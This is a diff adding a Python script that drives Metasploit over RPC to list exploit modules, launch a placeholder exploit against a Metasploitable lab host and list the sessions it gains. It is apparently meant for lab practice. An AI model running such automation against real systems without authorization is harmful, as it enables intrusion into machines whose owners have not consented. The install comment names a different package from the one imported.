@@ -1,0 +1,34 @@
+#ensure you have pymetasploit installed:
+#bash - pip install pymetasploit
+
+from pymetasploit3.msfrpc import MsfRpcClient
+
+# Connect to the Metasploit RPC service
+client = MsfRpcClient('your_host', your_port, 'your_username', 'your_password')
+
+# List available modules
+modules = client.modules.exploits
+print("Available Exploit Modules:")
+for module in modules:
+    print(module)
+
+# Launch an exploit against Metasploitable
+exploit = client.modules.use('exploit', 'your_exploit_module')
+# Replace with the desired exploit module
+exploit['RHOSTS'] = 'metasploitable_ip'
+# Replace with the IP address of Metasploitable
+
+# Run the exploit
+exploit.execute()
+
+# List the sessions created by the exploit
+sessions = client.sessions.list
+print("Active Sessions:")
+for session in sessions:
+    print(session)
+
+#Replace 'your_host', your_port, 'your_username', and 'your_password'
+#with the appropriate connection details to your Metasploit RPC service.
+
+#Replace 'your_exploit_module' with the name of the exploit module you want to use against Metasploitable.
+#Ensure you have the necessary permissions and authorization to perform these actions.
